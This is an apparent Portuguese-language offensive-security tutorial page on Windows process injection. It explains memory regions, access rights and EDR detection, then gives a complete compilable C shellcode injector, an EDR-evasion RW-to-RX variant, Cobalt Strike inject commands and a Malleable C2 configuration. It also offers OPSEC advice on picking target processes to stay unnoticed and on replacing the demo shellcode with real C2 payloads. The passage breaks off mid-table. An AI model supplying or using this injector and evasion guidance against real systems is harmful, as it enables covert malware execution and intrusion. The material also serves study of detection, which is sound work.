---
layout: cyber
section: injecao-processo
title: "Injeção de Processo: Fundamentos"
---

# Injeção de Processo: Fundamentos

# O que é?

Process Injection é uma classe de técnicas que executa código arbitrário dentro do espaço de endereçamento de outro processo em vez de criar um novo processo separado. É uma das técnicas mais fundamentais da ofensiva moderna em Windows — e também das mais antigas, existindo desde os primeiros debuggers e ferramentas de profiling dos anos 1990.

O fundamento técnico é o modelo de memória virtual do Windows. Cada processo no sistema operacional possui seu próprio **espaço de endereçamento virtual privado**: em sistemas x86 são 4 GB de endereços virtuais (2 GB para user space, 2 GB para kernel); em x64 o user space pode atingir 128 TB. Esse isolamento é proposital — processos não enxergam diretamente a memória uns dos outros. O Windows, porém, expõe uma API deliberada para que processos autorizados (debuggers, profilers, ferramentas de segurança) possam cruzar essa fronteira.

A API central para injeção remota no Windows compreende:

```
OpenProcess          --> obter handle para o processo alvo
VirtualAllocEx       --> alocar memória no espaço do processo alvo
WriteProcessMemory   --> escrever código/dados nessa memória
CreateRemoteThread   --> criar thread no processo alvo apontando para o código
NtCreateThreadEx     --> versão NT de CreateRemoteThread (menos hookeada por EDRs)
RtlCreateUserThread  --> alternativa indireta ao CreateRemoteThread
QueueUserAPC         --> enfileirar chamada assíncrona em thread existente
SetThreadContext     --> redirecionar thread existente (thread hijacking)
```

A distinção entre **injeção local** (self-injection — o processo modifica a própria memória) e **injeção remota** (cross-process — um processo manipula outro) é central. Na injeção local não há chamada OpenProcess — apenas VirtualAlloc, WriteProcessMemory (ou cópia direta via ponteiro), e algum mecanismo de execução (CreateThread, fibers, APCs). Na injeção remota o handle remoto é o ponto de detecção mais óbvio.

As variantes mais conhecidas de process injection são:

```
DLL Injection
  --> Forçar o processo alvo a carregar uma DLL via LoadLibrary
  --> A DLL aparece na lista de módulos carregados (MEM_IMAGE)
  --> Mecanismo: CreateRemoteThread apontando para LoadLibraryA

Shellcode Injection
  --> Escrever bytes de código máquina PIC (Position Independent Code)
  --> Memória alocada é MEM_PRIVATE sem backing file — mais suspeita
  --> Não aparece na lista de módulos

Process Hollowing
  --> Criar processo suspenso (CREATE_SUSPENDED)
  --> Desmapar a imagem original (NtUnmapViewOfSection)
  --> Mapear payload no lugar
  --> Ajustar PEB, retomar execução
  --> Processo parece legítimo externamente

Reflective DLL Injection
  --> DLL que contém seu próprio loader em memória
  --> Não chama LoadLibrary — resolve imports, relocs manualmente
  --> Sem registro no loader list do processo
```

A escolha da variante depende do contexto — nível de privilégio disponível, características do processo alvo, cobertura do EDR implantado, e o perfil de detecção aceitável para a operação.

# Onde é implementado?

Injeção de código em outros processos é uma funcionalidade legítima e amplamente usada no ecossistema Windows. Compreender os usos legítimos é essencial: é exatamente essa legitimidade que torna a detecção maliciosa difícil.

**Debuggers** são o caso mais óbvio. O WinDbg, x64dbg e Visual Studio Debugger injetam código nos processos que depuram. Quando você atribui um breakpoint em hardware, o debugger modifica o contexto de thread do processo alvo via SetThreadContext. O comando `!inject` do WinDbg executa código arbitrário no processo sendo debugado via CreateRemoteThread. O próprio mecanismo de attach (DebugActiveProcess) transfere controle entre processos.

**Profilers de performance** como o Visual Studio Profiler e o VTune da Intel injetam DLLs de instrumentação nos processos analisados. Essas DLLs hookeiam chamadas de função, contam alocações de memória, rastreiam threads — tudo via as mesmas APIs de injeção. O Intel VTune usa WriteProcessMemory para inserir breakpoints de software em código nativo.

**Soluções de antivírus e EDR** — de forma ironicamente simétrica — são usuárias massivas de process injection. O CrowdStrike Falcon, o Microsoft Defender for Endpoint, o SentinelOne, todos injetam suas DLLs de monitoramento em cada processo do sistema. São essas DLLs que hookeiam as APIs do Windows em userland (técnica de API hooking via trampolins) para interceptar chamadas suspeitas. O mecanismo de injeção é idêntico ao que usam para detectar ataques.

**Software de captura de tela e streaming**, como o OBS Studio e o Fraps (histórico), utilizam injeção de código em processos gráficos para capturar o framebuffer antes de ser apresentado na tela. O OBS, em particular, injeta um hook de Direct3D/OpenGL nos processos de jogo para captura de alta performance (Game Capture mode).

**Sistemas anti-cheat** como o Valve Anti-Cheat (VAC), o BattlEye e o EasyAntiCheat residem parcialmente no espaço de usuário dos processos de jogo via injeção. Eles monitoram chamadas de API, escanem memória em busca de cheat signatures, e verificam a integridade do código do jogo — usando as mesmas primitivas de memória que cheaters usam.

**O próprio Windows** injeta DLLs em processos via o mecanismo de Application Compatibility Shims (AppCompat). O processo `svchost.exe` que hospeda o serviço AppInfo pode aplicar "shims" — patches de compatibilidade em memória — em processos legados. O mecanismo de **Known DLLs** garante que determinadas DLLs do sistema (ntdll.dll, kernel32.dll) sejam mapeadas de uma seção compartilhada de memória. Redirecionamento de DLL (via manifests, API sets) é outro mecanismo de modificação transparente de imports.

**Frameworks de Dependency Injection em .NET** como o MEF (Managed Extensibility Framework) e ferramentas de mocking (Moq, TypeMock) realizam IL injection — modificação do bytecode .NET em memória para interceptar chamadas de método. Tecnicamente distinto de process injection Win32, mas conceitualmente idêntico.

A consequência direta: quando um EDR vê WriteProcessMemory seguido de CreateRemoteThread, ele não pode simplesmente bloquear — seria uma injeção legítima ou maliciosa? O contexto (processo de origem, processo alvo, conteúdo injetado, comportamento subsequente) é que diferencia.

# Como funciona de forma adequada?

Para entender process injection em profundidade, é necessário entender o modelo de memória de processo do Windows e como as APIs de manipulação remota funcionam no contexto legítimo de um debugger.

## Modelo de memória virtual de um processo Windows (x64)

```
Espaço de Endereçamento Virtual do Processo (128 TB user space em x64)
+----------------------------------------------------------+
|  0x0000000000000000  (NULL page — inacessível)           |
|                                                          |
|  Regiões do processo:                                    |
|                                                          |
|  +--------------------+  <- Image base (ex: 0x00400000) |
|  |  .text  (código)   |  PAGE_EXECUTE_READ               |
|  |  .rdata (strings)  |  PAGE_READONLY                   |
|  |  .data  (globals)  |  PAGE_READWRITE                  |
|  |  .rsrc  (recursos) |  PAGE_READONLY                   |
|  +--------------------+  (MEM_IMAGE — backed by PE disk) |
|                                                          |
|  +--------------------+  <- Stack de cada thread         |
|  |  Thread Stack      |  PAGE_READWRITE + guard page     |
|  +--------------------+  (MEM_PRIVATE)                   |
|                                                          |
|  +--------------------+  <- Heap do processo             |
|  |  Heap              |  PAGE_READWRITE                  |
|  +--------------------+  (MEM_PRIVATE)                   |
|                                                          |
|  +--------------------+  <- DLLs carregadas              |
|  |  ntdll.dll         |  MEM_IMAGE (shared section)      |
|  |  kernel32.dll      |  MEM_IMAGE (shared section)      |
|  |  user32.dll        |  MEM_IMAGE                       |
|  |  ...               |                                  |
|  +--------------------+                                  |
|                                                          |
|  0x00007FFFFFFFFFFF  (fim do user space)                 |
+----------------------------------------------------------+
|  0xFFFF800000000000  (início do kernel — inacessível)    |
|  Kernel mapeado mas não acessível de user mode           |
+----------------------------------------------------------+
```

O kernel mantém uma estrutura chamada **VAD (Virtual Address Descriptor)** — uma árvore AVL que descreve cada região de memória mapeada no processo. Cada nó contém: endereço base, endereço final, tipo de memória (MEM_IMAGE, MEM_PRIVATE, MEM_MAPPED), e flags de proteção.

Tipos de proteção de memória relevantes:

```
PAGE_READONLY           (0x02)  -- somente leitura
PAGE_READWRITE          (0x04)  -- leitura e escrita (heap, stack)
PAGE_EXECUTE            (0x10)  -- somente execução (raro)
PAGE_EXECUTE_READ       (0x20)  -- execução + leitura (código normal)
PAGE_EXECUTE_READWRITE  (0x40)  -- RWX — suspeito para EDRs
PAGE_EXECUTE_WRITECOPY  (0x80)  -- execução com copy-on-write
```

A presença de PAGE_EXECUTE_READWRITE (RWX) em uma região MEM_PRIVATE sem backing file em disco é o IOC mais claro de shellcode injection.

## Access rights necessários para injeção remota

```
OpenProcess precisa de:

PROCESS_VM_OPERATION    (0x0008)  -- VirtualAllocEx, VirtualFreeEx, VirtualProtectEx
PROCESS_VM_WRITE        (0x0020)  -- WriteProcessMemory
PROCESS_VM_READ         (0x0010)  -- ReadProcessMemory
PROCESS_CREATE_THREAD   (0x0002)  -- CreateRemoteThread
PROCESS_QUERY_INFORMATION (0x0400) -- GetExitCodeProcess, info do processo
PROCESS_QUERY_LIMITED_INFORMATION (0x1000) -- versão restrita, menos privilegiada

PROCESS_ALL_ACCESS = combinação de todos (0x1FFFFF) — muito barulhento
```

A razão pela qual EDRs monitoram **sequências** de chamadas e não chamadas individuais é que cada uma dessas APIs tem uso legítimo isolado — `VirtualAllocEx` é usada por debuggers, `WriteProcessMemory` por hotpatchers, `CreateRemoteThread` por DLL injection em apps que fazem isso intencionalmente. O padrão que distingue injeção maliciosa é a sequência: `OpenProcess` (com flags suficientes) → `VirtualAllocEx` (MEM_COMMIT + PAGE_EXECUTE_READWRITE) → `WriteProcessMemory` → `CreateRemoteThread` em intervalo de milissegundos, originada de um processo sem relação histórica com o alvo. EDRs como CrowdStrike e SentinelOne mantêm state machines de contexto por processo — a detecção dispara quando a sequência completa ocorre em janela temporal, não em cada API individual.

Para processos rodando como SYSTEM (lsass.exe, winlogon.exe), mesmo um administrador precisa de **SeDebugPrivilege** habilitado explicitamente — o privilégio existe no token mas fica desabilitado por padrão para prevenir escalada acidental.

## Como um debugger legítimo usa essas APIs (exemplo WinDbg)

```
Cenário: WinDbg fazendo attach em notepad.exe (PID 1234)

1. DebugActiveProcess(1234)
   --> Windows injeta EXCEPTION_DEBUG_EVENT no processo
   --> notepad.exe pausa, transfere controle para WinDbg

2. Usuário define breakpoint em kernel32!WriteFile:
   WinDbg --> ReadProcessMemory(handle, addr_WriteFile, orig_byte, 1)
          --> WriteProcessMemory(handle, addr_WriteFile, 0xCC, 1)  // INT3
   
3. Quando breakpoint é atingido:
   EXCEPTION_BREAKPOINT --> WinDbg restaura byte original
   WinDbg --> SetThreadContext(thread, contexto_modificado)

4. Comando "!inject" do WinDbg para executar código no processo:
   WinDbg --> VirtualAllocEx(handle, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
          --> WriteProcessMemory(handle, mem, shellcode, size)
          --> CreateRemoteThread(handle, NULL, 0, mem, NULL, 0, NULL)

Toda essa sequência usa exatamente as mesmas APIs que um malware usaria.
O contexto (WinDbg como processo pai, processo de desenvolvimento) é o que diferencia.
```

## O fluxo clássico VirtualAllocEx → WriteProcessMemory → CreateRemoteThread

```
Processo Atacante (ex: loader.exe)          Processo Alvo (ex: explorer.exe)
+----------------------------+              +----------------------------+
|                            |              |  Virtual Address Space:    |
| 1. OpenProcess(pid, flags) |              |  +----------------------+  |
|    --> HANDLE hProc        |              |  | .text (código)       |  |
|                            |              |  | .data (dados)        |  |
| 2. VirtualAllocEx(         |              |  | DLLs carregadas      |  |
|      hProc,                |  [cria       |  |                      |  |
|      NULL,                 |   região] -> |  | [NOVA REGIÃO]        |  |
|      shellcodeSize,        |              |  | PAGE_READWRITE       |  |
|      MEM_COMMIT,           |              |  | MEM_PRIVATE          |  |
|      PAGE_READWRITE)       |              |  | addr = 0x1A2B3C4D    |  |
|    --> addr                |              |  +----------------------+  |
|                            |              |                            |
| 3. WriteProcessMemory(     |  [escreve] ->|  [shellcode bytes na       |
|      hProc,                |              |   região alocada]          |
|      addr,                 |              |                            |
|      shellcode,            |              |                            |
|      size)                 |              |                            |
|                            |              |                            |
| 4. VirtualProtectEx(       |  [muda] ---> |  [região: PAGE_EXECUTE_READ|
|      hProc,                |              |   remove o W do RWX]       |
|      addr, size,           |              |                            |
|      PAGE_EXECUTE_READ)    |              |                            |
|                            |              |                            |
| 5. CreateRemoteThread(     |  [cria] ---> |  [nova thread no processo] |
|      hProc,                |              |  StartAddress = addr       |
|      NULL, 0,              |              |  --> shellcode executa     |
|      addr, NULL, 0)        |              |      no contexto do        |
|    --> HANDLE hThread      |              |      explorer.exe          |
|                            |              |                            |
+----------------------------+              +----------------------------+
```

## Por que process injection existe como feature legítima

O Windows foi projetado desde o início com a premissa de que processos autorizados podem inspecionar e modificar outros processos. Os casos de uso legítimos são tantos — debuggers, profilers, ferramentas de segurança, sistemas de compatibilidade — que a API existe de forma intencional e documentada. A linha entre uso legítimo e malicioso é traçada por: quem está fazendo (processo de origem), em qual processo (alvo), o que está sendo injetado (conteúdo), e o que acontece depois (comportamento).

---

## A Base: Modelo de Memória, EPROCESS, PEB

### Modelo de Memória de Processo no Windows

Para entender injeção de processo, você precisa entender como o Windows gerencia memória de processo. Cada processo no Windows tem seu próprio **espaço de endereço virtual privado** - no Windows x64, isso é tipicamente um espaço de 128TB de endereços virtuais.

#### VAD: Virtual Address Descriptor

O kernel mantém uma estrutura chamada **VAD (Virtual Address Descriptor)** - uma árvore AVL que descreve todas as regiões de memória mapeadas no processo. Cada nó da VAD descreve uma região com:

- Endereço base (`StartingVpn`)
- Endereço final (`EndingVpn`)
- Flags de proteção (Read, Write, Execute, Copy-on-Write)
- Tipo de mapeamento (privado, mapeado de arquivo, imagem PE)

Você pode inspecionar a VAD com WinDbg:
```
!vad
```

Ou com o Sysinternals VMMap. Do ponto de vista do atacante, regiões de memória do tipo `MEM_PRIVATE` sem backing file em disco são **altamente suspeitas** para EDRs modernos. Regiões do tipo `MEM_IMAGE` (backed by a PE on disk) são muito menos suspeitas.

#### Tipos de Memória e Permissões

Cada região de memória tem um conjunto de permissões:
- `PAGE_READONLY` (0x02) - apenas leitura
- `PAGE_READWRITE` (0x04) - leitura e escrita
- `PAGE_EXECUTE` (0x10) - apenas execução
- `PAGE_EXECUTE_READ` (0x20) - execução e leitura
- `PAGE_EXECUTE_READWRITE` (0x40) - todas as permissões (RWX - **extremamente suspeito**)
- `PAGE_EXECUTE_WRITECOPY` (0x80) - execução com copy-on-write

A existência de memória `PAGE_EXECUTE_READWRITE` é um indicador de comprometimento bem conhecido. Ferramentas como Get-InjectedThread e Hunt-Sleeping-Beacons procuram especificamente por threads executando em regiões com essas características.

#### Estados de Memória

Cada região está em um de três estados:
- `MEM_FREE` - não alocada, não acessível
- `MEM_RESERVE` - reservada mas sem física alocada
- `MEM_COMMIT` - committed, com física backing (swap ou RAM)

Apenas regiões `MEM_COMMIT` são acessíveis. `VirtualAllocEx` com `MEM_COMMIT | MEM_RESERVE` cria e torna acessível em um passo.

### Handles e Privilégios

Para injetar em outro processo, você precisa de um **handle** para esse processo com permissões suficientes.

#### OpenProcess e Privilégios de Acesso

```c
HANDLE OpenProcess(
    DWORD dwDesiredAccess,  // Direitos de acesso desejados
    BOOL  bInheritHandle,   // Se o handle é herdável
    DWORD dwProcessId       // PID do processo alvo
);
```

Para o flow clássico de injeção (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread), você precisa de:
- `PROCESS_VM_OPERATION` (0x0008) - necessário para VirtualAllocEx e VirtualFreeEx
- `PROCESS_VM_WRITE` (0x0020) - necessário para WriteProcessMemory
- `PROCESS_CREATE_THREAD` (0x0002) - necessário para CreateRemoteThread
- `PROCESS_QUERY_INFORMATION` (0x0400) - para obter informações do processo (como base address)

Na prática, a maioria das implementações usa `PROCESS_ALL_ACCESS` (0x1FFFFF) por conveniência, mas isso é **altamente detectável** - EDRs monitoram chamadas `OpenProcess` com `PROCESS_ALL_ACCESS` em processos críticos.

**OPSEC melhor**: usar apenas os direitos mínimos necessários para a operação.

#### SeDebugPrivilege

Por padrão, mesmo um administrador local não pode abrir handle com `PROCESS_ALL_ACCESS` para processos rodando como `SYSTEM` (como `lsass.exe`, `winlogon.exe`). Para isso, é necessário o privilégio `SeDebugPrivilege`.

`SeDebugPrivilege` está disponível para membros do grupo `Administrators` mas **não está ativado por padrão** - precisa ser habilitado explicitamente:

```c
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp,
                               sizeof(TOKEN_PRIVILEGES),
                               NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}
```

**OPSEC**: Habilitar `SeDebugPrivilege` é monitorado. Em uma operação real, prefira trabalhar com processos que já são acessíveis sem esse privilégio (processos do mesmo usuário).

---

## Na Prática

### O Flow Clássico: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread

Este é o método mais documentado e, portanto, o mais detectado. Mas entendê-lo é fundamental porque todos os métodos avançados são variações ou aprimoramentos dele.

**Passo 1: Obter handle para o processo alvo**
```
OpenProcess(acesso, pid) -> HANDLE
```

**Passo 2: Alocar memória no processo alvo**
```
VirtualAllocEx(handle, NULL, tamanho, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) -> endereço
```

**Passo 3: Escrever shellcode na memória alocada**
```
WriteProcessMemory(handle, endereço, shellcode, tamanho, NULL)
```

**Passo 4: Criar thread remota apontando para o shellcode**
```
CreateRemoteThread(handle, NULL, 0, endereço, NULL, 0, NULL) -> HANDLE de thread
```

### Escolha do Processo Alvo

Esta é uma das decisões mais críticas de OPSEC em uma operação. Os critérios são:

**Critérios de Estabilidade**
- O processo pode crashar? (`notepad.exe` pode ser fechado pelo usuário; `svchost.exe` é muito mais estável)
- O processo tem restart automático? (serviços Windows reiniciam automaticamente)
- O processo é single-instance ou multi-instance?

**Critérios de Contexto de Usuário**
- Você quer o mesmo contexto do usuário atual ou elevar para SYSTEM?
- `explorer.exe` roda como o usuário logado - ideal para operações de usuário
- `svchost.exe` instâncias específicas rodam como SYSTEM - ideal para operações privilegiadas

**Critérios de Longevidade**
- Por quanto tempo você precisa que o implante sobreviva?
- Processos de sessão de login (`explorer.exe`, `dwm.exe`) vivem enquanto o usuário estiver logado
- Serviços podem ser configurados para reiniciar indefinidamente

**Critérios de Suspeição**
- `notepad.exe` fazendo conexões de rede = muito suspeito
- `svchost.exe` fazendo conexões de rede = normal
- `explorer.exe` com thread anômala = moderadamente suspeito
- `dllhost.exe` = usado pelo Cobalt Strike como spawnto padrão por ser menos monitorado

**Processos comumente usados em operações reais:**
- `svchost.exe -k netsvcs` - extremamente comum fazer rede, estável, SYSTEM
- `explorer.exe` - onipresente, contexto de usuário, mas monitorado
- `dllhost.exe` - menos monitorado, contexto variável
- `WerFault.exe` - incomum mas legítimo fazer operações de memória
- `RuntimeBroker.exe` - UWP broker, menos comum em análise
- `sihost.exe` - Shell Infrastructure Host

### Injeção de Shellcode vs. DLL

**Injeção de Shellcode:**
- Você escreve bytes brutos de código de máquina no processo alvo
- Precisa de shellcode Position Independent Code (PIC) - sem dependências de endereços absolutos
- Não aparece na lista de módulos do processo (`lsm32.dll`, etc.)
- Memória alocada é `MEM_PRIVATE` sem backing file - **suspeito para EDRs**
- Vantagem: sem arquivo em disco obrigatório, mais furtivo em alguns cenários

**Injeção de DLL:**
- Você força o processo alvo a carregar uma DLL legítima do disco
- A DLL aparece na lista de módulos do processo com seu nome e caminho
- Memória é `MEM_IMAGE` backed by file - **menos suspeito**
- Desvantagem: requer arquivo em disco (artifact persistente), `LoadLibrary` call é monitorado

**Diferença em termos de detecção:**
```
Shellcode injection:
  - Região MEM_PRIVATE + PAGE_EXECUTE_READWRITE = IOC forte
  - Thread com start address em região não-backed = IOC forte
  - Ausência de módulo correspondente ao código executando = IOC médio

DLL injection:
  - LoadLibrary call de processo externo via CreateRemoteThread = IOC forte
  - DLL sem assinatura válida = IOC médio
  - DLL em path incomum = IOC médio
```

### Injeção em Processo Atual vs. Remoto

**Injeção em processo atual (self-injection):**
- Não precisa de handle para outro processo
- Sem `OpenProcess` = sem IOC dessa chamada
- Útil para executar shellcode inicial de um dropper/stager
- Técnicas: `VirtualAlloc` (local) + `CreateThread`, ou fibers, ou via APCs em threads próprias

**Injeção remota:**
- Requer handle com privilégios suficientes para o processo alvo
- `OpenProcess` com privilégios elevados é monitorado
- Necessário para migração de processo
- Maior superfície de detecção, maior efeito de evasão quando bem executado

---

## Exemplos de Código / Comandos

### Implementação C Completa: Classic Shellcode Injection

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Habilita SeDebugPrivilege para acessar processos privilegiados
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken)) {
        printf("[-] OpenProcessToken falhou: %d\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[-] LookupPrivilegeValue falhou: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp,
                               sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges falhou: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] Privilegio nao disponivel (nao e admin?)\n");
        CloseHandle(hToken);
        return FALSE;
    }

    printf("[+] SeDebugPrivilege habilitado\n");
    CloseHandle(hToken);
    return TRUE;
}

// Encontra PID pelo nome do processo
DWORD GetProcessIdByName(const wchar_t* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot falhou: %d\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        printf("[-] Process32First falhou: %d\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (wcscmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

// Injeta shellcode no processo alvo usando o metodo classico
// VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
BOOL InjectShellcode(DWORD targetPid, unsigned char* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = NULL;
    LPVOID pRemoteMemory = NULL;
    HANDLE hThread = NULL;
    DWORD bytesWritten = 0;

    printf("[*] Abrindo processo PID=%d\n", targetPid);

    // NOTA OPSEC: PROCESS_ALL_ACCESS e muito barulhento.
    // Minimo necessario: PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD
    // Usamos ALL_ACCESS aqui para clareza didatica.
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,  // Em producao: use direitos minimos
        FALSE,
        targetPid
    );

    if (hProcess == NULL) {
        printf("[-] OpenProcess falhou: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Handle obtido: 0x%p\n", hProcess);

    // Aloca memoria no processo remoto.
    // MEM_COMMIT | MEM_RESERVE: aloca e commita em um passo.
    // PAGE_EXECUTE_READWRITE: necessario para escrita seguida de execucao.
    // OPSEC: RWX e um IOC. Alternativa: alocar RW, escrever, mudar para RX com VirtualProtectEx.
    pRemoteMemory = VirtualAllocEx(
        hProcess,
        NULL,                           // Deixa o SO escolher o endereco
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE          // IOC: trocar por RW depois RX em OPSEC real
    );

    if (pRemoteMemory == NULL) {
        printf("[-] VirtualAllocEx falhou: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Memoria alocada em: 0x%p (%zu bytes)\n", pRemoteMemory, shellcodeSize);

    // Escreve o shellcode na memoria remota alocada
    if (!WriteProcessMemory(
        hProcess,
        pRemoteMemory,
        shellcode,
        shellcodeSize,
        (SIZE_T*)&bytesWritten
    )) {
        printf("[-] WriteProcessMemory falhou: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Shellcode escrito: %d bytes\n", bytesWritten);

    // OPSEC opcional: mudar protecao para RX apos escrita
    // Isso remove o W de RWX, tornando menos obvio
    DWORD oldProtect;
    VirtualProtectEx(hProcess, pRemoteMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    printf("[+] Protecao alterada para RX\n");

    // Cria thread remota que comecar a executar no inicio do shellcode.
    // lpStartAddress aponta para o nosso shellcode no processo remoto.
    // OPSEC: CreateRemoteThread e muito monitorado. Alternativas: NtCreateThreadEx,
    // RtlCreateUserThread, QueueUserAPC, SetThreadContext em thread suspensa.
    hThread = CreateRemoteThread(
        hProcess,
        NULL,           // Security attributes padrao
        0,              // Stack size padrao
        (LPTHREAD_START_ROUTINE)pRemoteMemory,  // Entry point = inicio do shellcode
        NULL,           // Parametro para a thread (lpParameter)
        0,              // Flags (0 = iniciar imediatamente)
        NULL            // Thread ID (nao precisamos)
    );

    if (hThread == NULL) {
        printf("[-] CreateRemoteThread falhou: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread remota criada: 0x%p\n", hThread);
    printf("[+] Injecao completa! Aguardando...\n");

    // Aguarda a thread terminar (opcional - shellcode de C2 geralmente nao termina)
    WaitForSingleObject(hThread, 3000);  // Timeout de 3s

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    // Shellcode de exemplo: apenas um breakpoint (0xCC) para demonstracao
    // Em uso real: substitua pelo seu shellcode de C2 (ex: Cobalt Strike stageless)
    unsigned char shellcode[] = {
        // msfvenom -p windows/x64/exec CMD=calc.exe -f c (exemplo educacional)
        // Para uso real: gere com msfvenom, CS artifact kit, ou custom shellcode
        0x90, 0x90, 0xCC  // NOP, NOP, INT3 - apenas demonstracao
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    if (argc < 2) {
        printf("Uso: %ls <nome_processo>\n", argv[0]);
        printf("Exemplo: %ls explorer.exe\n", argv[0]);
        return 1;
    }

    // Habilita debug privilege para acessar processos privilegiados
    // (falha silenciosamente se nao for admin - ainda pode injetar em processos do usuario)
    EnableDebugPrivilege();

    // Encontra o PID do processo alvo
    DWORD targetPid = GetProcessIdByName(argv[1]);
    if (targetPid == 0) {
        printf("[-] Processo '%ls' nao encontrado\n", argv[1]);
        return 1;
    }
    printf("[+] Processo encontrado: %ls PID=%d\n", argv[1], targetPid);

    // Executa a injecao
    if (!InjectShellcode(targetPid, shellcode, shellcodeSize)) {
        printf("[-] Injecao falhou\n");
        return 1;
    }

    printf("[+] Injecao bem-sucedida!\n");
    return 0;
}
```

**Compilar:**
```bash
# Cross-compile para Windows em Linux
x86_64-w64-mingw32-gcc -o inject.exe inject.c -lntdll

# Ou no Windows com MSVC
cl.exe inject.c /link /out:inject.exe
```

### Implementacao OPSEC-Melhorada: RW -> RX Pattern

```c
// Padrao melhorado: alocar RW, escrever, depois tornar RX
// Isso evita a presenca de RWX na memoria

LPVOID pRemoteMemory = VirtualAllocEx(
    hProcess,
    NULL,
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE  // Apenas RW inicialmente
);

// Escreve shellcode...
WriteProcessMemory(hProcess, pRemoteMemory, shellcode, shellcodeSize, NULL);

// Muda para RX antes de executar
DWORD oldProtect;
VirtualProtectEx(hProcess, pRemoteMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

// Agora cria a thread
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);
```

### Como Cobalt Strike Faz Injeção

O Cobalt Strike implementa injeção via os seguintes comandos no Beacon:

```
# Injetar shellcode (stageless) num processo remoto
# O Beacon usa o processo spawnto configurado se nenhum PID for especificado
inject <pid> <arch> <listener>

# Injetar shellcode personalizado num processo
shinject <pid> <arch> /path/to/shellcode.bin

# Injetar DLL num processo
dllinject <pid> /path/to/dll.dll

# Migrar o proprio beacon para outro processo
inject <pid> x64 <listener_atual>
```

**O flow do Cobalt Strike inject:**
1. Abre handle para o processo alvo com direitos necessários
2. Aloca memória com `VirtualAllocEx`
3. Escreve o payload (shellcode do listener)
4. Executa usando o método configurado no Malleable C2 profile (`process-inject` block)
5. O novo beacon se conecta de volta ao C2

**Configuração do método de injeção no Malleable C2:**
```
process-inject {
    # Tecnica de alocacao de memoria
    set allocator "NtMapViewOfSection";  # Alternativa a VirtualAllocEx
    
    # Tecnica de execucao
    set userwx "false";  # Evita RWX
    
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
```

### Enumeração de Processos — 3 Métodos

Cada método tem trade-offs de detecção vs informação retornada. Malware author deve dominar todos para imprevisibilidade.

#### Comparação Rápida

| Método | API base | Hookable | Retorna Handle | Privilégios necessários | OPSEC |
|--------|----------|----------|----------------|--------------------------|-------|
| `CreateToolhelp32Snapshot` | kernel32 | Sim (heavy) | Não | Qualquer | Pior — snapshot inteiro do sistema, alta visibilidade |
| `EnumProcesses` | psapi | Sim | Sim (via OpenProcess) | PROCESS_QUERY_INFORMATION | Médio — usa PSAPI menos hookada |
